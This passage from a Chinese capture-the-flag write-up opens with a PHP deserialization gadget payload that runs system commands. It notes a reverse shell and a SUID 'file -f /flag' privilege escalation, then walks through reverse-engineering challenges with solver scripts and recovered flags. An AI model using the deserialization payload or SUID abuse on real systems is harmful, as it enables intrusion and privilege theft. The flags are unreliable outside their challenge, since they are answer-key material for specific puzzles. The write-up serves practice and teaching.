class="string">&#x27;system&#x27;</span></span><br><span class="line">    public_Starven=<span class="string">&#x27;invoke&#x27;</span></span><br><span class="line">    public_Girlfriend=<span class="string">&#x27;ls -al /&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Challenge</span>:</span><br><span class="line">    public_file=Syclover()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Geek</span>:</span><br><span class="line">    public_a=<span class="string">&#x27;x&#x27;</span></span><br><span class="line">    public_b=[Challenge(),<span class="string">&#x27;Sink&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(serialize(Geek()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># O:4:&quot;Geek&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;x&quot;;s:1:&quot;b&quot;;a:2:&#123;i:0;O:9:&quot;Challenge&quot;:1:&#123;s:4:&quot;file&quot;;O:8:&quot;Syclover&quot;:4:&#123;s:10:&quot;Girlfriend&quot;;s:8:&quot;ls -al /&quot;;s:2:&quot;IS&quot;;s:6:&quot;system&quot;;s:7:&quot;Starven&quot;;s:6:&quot;invoke&quot;;s:5:&quot;Where&quot;;s:18:&quot;ReflectionFunction&quot;;&#125;&#125;i:1;s:4:&quot;Sink&quot;;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>得到：<code>-r--------    1 root root   42 Nov  6 11:53 flag</code></p><p>需要提权读/flag，修改命令反弹shell，反弹之后，<code>find / -perm -u=s -type f 2&gt;/dev/null</code> 发现file命令有s权限，<code>file -f /flag</code> 提权读出flag。</p><p>​    </p><h2 id="Reverse-2"><a href="#Reverse-2" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="ez-hook"><a href="#ez-hook" class="headerlink" title="ez_hook"></a>ez_hook</h3><blockquote><p>有个东西藏起来了,你能找到它吗</p></blockquote><p>去掉反调试 <code>if ( CheckRemoteDebuggerPresent(hProcess, &amp;pbDebuggerPresent) &amp;&amp; pbDebuggerPresent ) return 0;</code></p><p>动调，加密逻辑为：先reverse，再经过长度3的栅栏加密，再修改 <code>sub_4017E0()</code> 函数区域内容为 <code>sub_4018B4()</code>，逐字符异或7，得到密文：<code>zoXpih^lhX6soX7lr~DTHtGpX|</code>。</p><p>逆回flag：<code>SYC&#123;you_kn0w_wh@t_1s_hoOk&#125;</code>。</p><p>​    </p><h3 id="你干嘛"><a href="#你干嘛" class="headerlink" title="你干嘛~~"></a>你干嘛~~</h3><blockquote><p>Am1re很喜欢找哥哥，你干嘛啊~~</p></blockquote><p>分析发现base64字符串 <code>ZmFrZXthcmVfeW08X6JlYWx4X6JpZ7h9fQ==</code>，解码得到fake flag。</p><p>动调步进，发现SEH，异常进入catch。</p><p>在 <code>sub_4D1A50()</code> 函数发现SM4加密算法特征，如果加密结果和enc不同，则进入 <code>loc_4D1EED</code>，输出fake flag的base64。</p><p>获取SM4的key和IV为：</p><p><code>key=0O00O0O00OO0O0O0</code></p><p><code>iv=1III1II111I1I1I1</code></p><p>密文为：<code>enc_hex=216CFDA6B682AFCC516AD1E2A93EA690</code></p><p>解SM4/ZeroBytePadding，得到 <code>qwertyuiopasdfgh</code>。</p><p>作为key异或gif文件字节得到原始gif文件，其中一帧图有flag：<code>SYC&#123;111_YOU_WIN_THE_FLAG&#125;</code>.</p><p>​    </p><h3 id="blasting-master"><a href="#blasting-master" class="headerlink" title="blasting_master"></a>blasting_master</h3><blockquote><p>艺术就是爆炸！艺术就是派大星！</p></blockquote><p>动调发现加密逻辑为：</p><p>按下标+1每次循环取4个字符，md5后，对应的16个字符位每位做运算，<code>m[i] = (7*((i+42)^m[i])+82*(i%15))&amp;0xff</code>，存入数组s2。</p><p>逆：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># test</span></span><br><span class="line"><span class="string">from hashlib import *</span></span><br><span class="line"><span class="string">s = b&#x27;abcdef&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for j in range(len(s)):</span></span><br><span class="line"><span class="string">    ss = s[j:j+4]</span></span><br><span class="line"><span class="string">    m = list(bytes.fromhex(md5(ss).hexdigest()))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    for i in range(16):</span></span><br><span class="line"><span class="string">        m[i] = (7*((i+42)^m[i])+82*(i%15))&amp;0xff</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    #print(ss)</span></span><br><span class="line"><span class="string">    #print([hex(k)[2:] for k in m])</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line">table = string.printable</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dec</span>(<span class="params">x</span>):</span><br><span class="line">    t = <span class="built_in">list</span>(<span class="built_in">bytes</span>.fromhex(x))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        t[i] = (((t[i]-<span class="number">82</span>*(i%<span class="number">15</span>))*inverse(<span class="number">7</span>,<span class="number">256</span>))^(i+<span class="number">42</span>)) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(t).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5_bruteforce</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="keyword">return</span> mbruteforce(<span class="keyword">lambda</span> x: md5(x.encode()).hexdigest()==c, table, length=<span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;B250A0BC3A7F546D96070F719A72EBA5A0B571A46AB8BAFAE431C3715429A759202B1321BD675F8D653A0227084F929CB57CDF6934B8822DF6CA7A659863DC512A34974FF8BC231F38A8A62FA90D644CAC2FF9F52DB191A8D576D92DC6AC2E6932D5641DC13CECF52C90EDF4178B554CE46C3BB3DA29C07B39DF9273FCC9C2A86811222B643F129B95732A05D33F2E33F185ED077B868F622D7903AC80CEF5B2A00CF7E1C50E6327D16523EA5A1C020B32BA1FE5C722A56677EA5BE464AB8B60B6DF00DCF76D93EC2F2F680750E0D11A3FC64E2EC6BBAE0840D85B11B5DC15357F63493E5B9C0DFC0DB680B72B00EF3C0C2FEB864457749E5F1F8BA1C901F1D8F49282956F85D215221FF09FD1AB51399AB6C4DAFB388DE68C57195E94DA57CCF0B90A4A1782FCC54F4B5AA5F4E53EFA3A0AF4B48E7F25847590CD3587EBC3CE812B86C9167E85682DF1DB8E7415CF955107885E1BE937C95BBA61EB9F7BE48910F06ECD7571AD09745849A3F533837522951BE33C48055CADA86BFD41EBAFC60228C65ECF36AE50CE93F270889D3F4A9F86E76764B002960CAB9FEB4B034492DE6CF4CE324F4F38E25259CA954A11D830A27BD53AE611DA3A4A3361396526D278BCEDBDA58B2B874C95472502BA833DDCE46AAD67DD22B1BD2B7C53113CD923063D20BA28C82D8951576382A0C8A8DE2961C15351B0BC3704EEC9358AA8A266BA6F24B63F62416D1046CB061239D90EF9DC19A765B8C040BEF6999AAF0216374DA5754C424B1AF052DA38F36BA91ADCFA80B060B1FD737B78D9628326BF163371796F112FE9A7BB4646D68FF6217EFC6812866BFC51C9707A74BC8F6E0B86426F5CFDF74E2771FE37E6C86247FCD56CBA5CD9295A73AEC38FF0469532422DD0&#x27;</span></span><br><span class="line"></span><br><span class="line">c = [c[<span class="number">32</span>*i:<span class="number">32</span>*(i+<span class="number">1</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">32</span>)]</span><br><span class="line">m = [dec(k) <span class="keyword">for</span> k <span class="keyword">in</span> c]</span><br><span class="line"><span class="comment">#print(m)</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(m),<span class="number">4</span>):</span><br><span class="line">    flag += md5_bruteforce(m[i])</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># SYC&#123;W0w!y0u_@re_th3_BeSt_blasting_Exp3rt</span></span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(md5_bruteforce(m[-<span class="number">1</span>]))</span><br><span class="line"><span class="comment"># t!!&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SYC&#123;W0w!y0u_@re_th3_BeSt_blasting_Exp3rt!!&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="致我的星星"><a href="#致我的星星" class="headerlink" title="致我的星星"></a>致我的星星</h3><blockquote><p>做到这里应该有点小累了吧，wwzx和tx师傅想给大家打打气，不看html窝真的会伤心的</p><p>下载链接链接: <a href="https://pan.baidu.com/s/1IHyv4iy0NS1YeV0_EmXhYg?pwd=game">https://pan.baidu.com/s/1IHyv4iy0NS1YeV0_EmXhYg?pwd=game</a> 提取码: game</p></blockquote><p>审计 <code>index.js</code> 逻辑：</p><p><code>fl(e)</code> 中，按下一串大写字母字符串，md5为 <code>5c50152daeee511f32db7bf8a5502c69</code> 则正确。</p><p>先解方程：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">s = Solver()</span><br><span class="line">a1,a2,a3,a4,a5,a6,a7,a8 = [Int(<span class="string">f&#x27;f<span class="subst">&#123;i&#125;</span>&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line"></span><br><span class="line">s.add(<span class="number">43654</span>*a1 - <span class="number">57003</span>*a2 -<span class="number">3158</span>*a3 + <span class="number">30120</span>*a4 -<span class="number">58621</span>*a5 -<span class="number">41947</span>*a6 +<span class="number">122237</span>*a7 +<span class="number">129534</span>*a8 == <span class="number">2594143</span>)</span><br><span class="line">s.add(-<span class="number">48022</span>*a1 + <span class="number">18308</span>*a2 + <span class="number">52478</span>*a3 + <span class="number">69397</span>*a4  +<span class="number">49696</span>*a5 + <span class="number">12288</span>*a6 -<span class="number">40437</span>*a7 -<span class="number">23154</span>*a8 ==  <span class="number">651137</span>)</span><br><span class="line">s.add(<span class="number">124109</span>*a1  +<span class="number">58952</span>*a2 + <span class="number">16645</span>*a3 -<span class="number">17531</span>*a4 + <span class="number">53139</span>*a5  +<span class="number">49937</span>*a6  + <span class="number">3282</span>*a7   +<span class="number">7656</span>*a8 == <span class="number">2071815</span>)</span><br><span class="line">s.add(<span class="number">108286</span>*a1 + <span class="number">118886</span>*a2 +<span class="number">116876</span>*a3   +<span class="number">2281</span>*a4 -<span class="number">64590</span>*a5  -<span class="number">3021</span>*a6 + <span class="number">13386</span>*a7 -<span class="number">56070</span>*a8 ==  <span class="number">703</span>)</span><br><span class="line">s.add(<span class="number">105983</span>*a1 + <span class="number">8794</span>*a2 + <span class="number">31851</span>*a3 -<span class="number">35052</span>*a4  -<span class="number">7880</span>*a5  + <span class="number">2183</span>*a6 + <span class="number">47575</span>*a7 +<span class="number">107236</span>*a8 == <span class="number">2511919</span>)</span><br><span class="line">s.add(-<span class="number">38005</span>*a1 -<span class="number">6833</span>*a2 +<span class="number">107897</span>*a3 +<span class="number">119771</span>*a4 +<span class="number">124322</span>*a5 + <span class="number">13335</span>*a6+ <span class="number">121590</span>*a7 -<span class="number">17434</span>*a8 == <span class="number">4816084</span>)</span><br><span class="line">s.add(<span class="number">60696</span>*a1 +<span class="number">95253</span>*a2 +<span class="number">101581</span>*a3 + <span class="number">93822</span>*a4 +<span class="number">112989</span>*a5  +<span class="number">65643</span>*a6  +<span class="number">45639</span>*a7 + <span class="number">26705</span>*a8 == <span class="number">5330538</span>)</span><br><span class="line">s.add(<span class="number">49019</span>*a1 +<span class="number">72343</span>*a2 -<span class="number">21814</span>*a3  +<span class="number">85020</span>*a4 -<span class="number">62332</span>*a5  +<span class="number">99828</span>*a6  +  <span class="number">587</span>*a7 -<span class="number">65119</span>*a8 ==  <span class="number">505173</span>)</span><br><span class="line"><span class="built_in">print</span>(s.check())</span><br><span class="line">m = s.model()</span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    res.append(m[<span class="built_in">eval</span>(<span class="string">f&#x27;a<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>&#x27;</span>)].as_long())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [3, 4, 6, 8, 13, 13, 15, 15]</span></span><br></pre></td></tr></table></figure><p>对应S和Y的坐标：<code>S:(3,13) (8,13)</code> 和 <code>Y:(4,15) (6,15)</code>。</p><p>往下看，2轮（chance）对应2个迷宫，方向键为：上T下R左S右A，S和Y坐标分别对应每个迷宫的起点和终点，打印迷宫（10*20，补充一行）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">data = [</span><br><span class="line">    <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">coordinates = [</span><br><span class="line">    [<span class="number">1</span>, <span class="number">11</span>], [<span class="number">1</span>, <span class="number">12</span>], [<span class="number">1</span>, <span class="number">13</span>], [<span class="number">1</span>, <span class="number">14</span>],</span><br><span class="line">    [<span class="number">2</span>, <span class="number">1</span>], [<span class="number">2</span>, <span class="number">4</span>], [<span class="number">2</span>, <span class="number">11</span>], [<span class="number">2</span>, <span class="number">12</span>], [<span class="number">2</span>, <span class="number">14</span>],</span><br><span class="line">    [<span class="number">3</span>, <span class="number">4</span>], [<span class="number">3</span>, <span class="number">14</span>],</span><br><span class="line">    [<span class="number">5</span>, <span class="number">7</span>], [<span class="number">5</span>, <span class="number">8</span>], [<span class="number">5</span>, <span class="number">12</span>], [<span class="number">5</span>, <span class="number">14</span>], [<span class="number">5</span>, <span class="number">15</span>], [<span class="number">5</span>, <span class="number">18</span>],</span><br><span class="line">    [<span class="number">6</span>, <span class="number">1</span>], [<span class="number">6</span>, <span class="number">2</span>], [<span class="number">6</span>, <span class="number">4</span>], [<span class="number">6</span>, <span class="number">5</span>], [<span class="number">6</span>, <span class="number">7</span>], [<span class="number">6</span>, <span class="number">8</span>], [<span class="number">6</span>, <span class="number">11</span>], [<span class="number">6</span>, <span class="number">15</span>],</span><br><span class="line">    [<span class="number">7</span>, <span class="number">1</span>], [<span class="number">7</span>, <span class="number">5</span>], [<span class="number">7</span>, <span class="number">11</span>], [<span class="number">7</span>, <span class="number">12</span>], [<span class="number">7</span>, <span class="number">13</span>], [<span class="number">7</span>, <span class="number">14</span>], [<span class="number">7</span>, <span class="number">15</span>], [<span class="number">7</span>, <span class="number">16</span>],</span><br><span class="line">    [<span class="number">8</span>, <span class="number">1</span>], [<span class="number">8</span>, <span class="number">12</span>], [<span class="number">8</span>, <span class="number">13</span>], [<span class="number">8</span>, <span class="number">15</span>], [<span class="number">8</span>, <span class="number">18</span>],</span><br><span class="line">    [<span class="number">9</span>, <span class="number">3</span>], [<span class="number">9</span>, <span class="number">4</span>], [<span class="number">9</span>, <span class="number">6</span>], [<span class="number">9</span>, <span class="number">7</span>], [<span class="number">9</span>, <span class="number">8</span>]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">cols = <span class="number">20</span></span><br><span class="line">rows = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (row,col) <span class="keyword">in</span> coordinates:</span><br><span class="line">    index = row * cols + col</span><br><span class="line">    data[index] = <span class="string">&#x27;*&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># S:(3,13) (8,13)</span></span><br><span class="line"><span class="comment"># Y:(4,15) (6,15)</span></span><br><span class="line">data[(<span class="number">3</span>-<span class="number">1</span>)*cols+(<span class="number">13</span>-<span class="number">1</span>)] = data[(<span class="number">8</span>-<span class="number">1</span>)*cols+(<span class="number">13</span>-<span class="number">1</span>)] = <span class="string">&#x27;S&#x27;</span></span><br><span class="line">data[(<span class="number">4</span>-<span class="number">1</span>)*cols+(<span class="number">15</span>-<span class="number">1</span>)] = data[(<span class="number">6</span>-<span class="number">1</span>)*cols+(<span class="number">15</span>-<span class="number">1</span>)] = <span class="string">&#x27;Y&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(data[<span class="number">10</span>*i:<span class="number">10</span>*(i+<span class="number">1</span>)]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(data[<span class="number">10</span>*i:<span class="number">10</span>*(i+<span class="number">1</span>)]))</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">200</span><br><span class="line"></span><br><span class="line">##########</span><br><span class="line">##########</span><br><span class="line">##########</span><br><span class="line">#****#####</span><br><span class="line">#*##*#####</span><br><span class="line">#*S#*#####</span><br><span class="line">####*#####</span><br><span class="line">####Y#####</span><br><span class="line">##########</span><br><span class="line">##########</span><br><span class="line"></span><br><span class="line">#######**#</span><br><span 